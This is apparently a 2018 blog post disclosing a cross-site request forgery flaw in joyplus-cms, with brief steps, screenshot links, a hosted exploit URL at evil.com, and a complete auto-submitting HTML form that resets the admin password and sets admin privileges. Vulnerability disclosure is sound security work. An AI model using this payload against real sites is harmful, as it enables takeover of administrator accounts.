---
layout:     post                    # 使用的布局（不需要改）
title:      The new exploit in joyplus-cms              # 标题 
subtitle:   #副标题
date:       2018-10-09              # 时间
author:     oldT                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - 漏洞
---

#origin

The yesterday , i use the joyplus-cms Building a website for company. Finding a 
Vulnerability in the cms. The cms is not csrf  verification. The hacker can modify the password of admin,when the admin click the link of the hacker.

#First

we login in the number of admin.

![](OTGG.github.io/img/图片1.png)

#secondly

And click the link of the exploit . http://www.evil.com/exploit.html

The password was modified!

![](OTGG.github.io/img/图片2.png)

#Vulnerability

The Vulnerability in the interface . looking the follow picture.

http://www.example.com/joyplus-cms/manager/admin_ajax.php?action=save&tab={pre}manager

![](OTGG.github.io/img/图片3.png)

#exploit

The exploit.html is next code

$<form action=http://www.example.com/manager/admin_ajax.php?action=save&tab={pre}manager method=POST>
$<input type="text" name="m_id" value="1" />
$<input type="text" name="flag" value="edit" />
$<input type="text" name="m_name" value="admin" />
$<input type="text" name="m_password" value="222222" />	// the password
$<input type="text" name="m_levels%5B%5D" value="2" />
$<input type="text" name="m_levels%5B%5D" value="4" />
$<input type="text" name="m_levels%5B%5D" value="6" />
$<input type="text" name="m_levels%5B%5D" value="8" />
$<input type="text" name="m_levels%5B%5D" value="9" />
$<input type="text" name="m_levels%5B%5D" value="10" />
$<input type="text" name="m_levels%5B%5D" value="7" />
$<input type="text" name="m_status" value="1" />
$</form>
$<script> document.forms[0].submit(); </script> 
